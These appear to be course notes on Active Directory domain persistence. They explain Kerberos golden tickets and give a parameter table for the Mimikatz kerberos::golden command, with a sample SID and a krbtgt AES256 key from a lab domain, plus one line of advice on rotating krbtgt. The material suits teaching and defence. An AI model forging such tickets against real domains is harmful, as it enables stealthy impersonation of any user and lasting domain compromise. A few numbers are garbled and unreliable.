# **Domain Persistence**


- There is much to active directory than "just" the Domain Admin.
- Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!



## **Kerberos**

- Kerberos is the basis of authentication in a Windows Active Directory environment.
- Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller.
- These tickets represent the client's credentials.Therefore, Kerberos is understandably a very interesting target of abuse!



![](https://i.imgur.com/lpHU58k.png)



## **Golden Ticket**


- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.




![](https://i.imgur.com/f4Ti5Jm.png)




|  Options    |      |
|:-----|:-----|
|  kerberos::golden    |   Name of the module   |
|    /User:Administrator  |   Username for which the TGT is generated   |
|   /domain:dollarcorp.moneycorp.local   |  Domain FQDN    |
|  /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
|   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848   |   AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.  |
|    /id:500 /groups:512  |   Optional User RID (default 500) and Group default 513 512 520518 519)   |
| /ptt   |    Injects the ticket in current PowerShell process - no need to save the ticket on disk  |
|   OR         |
|    /ticket  |    Saves the ticket to a file for later use  |
|    /startoffset:0  |  Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.    |
|    /endin:600  |    Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes  |
|   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |



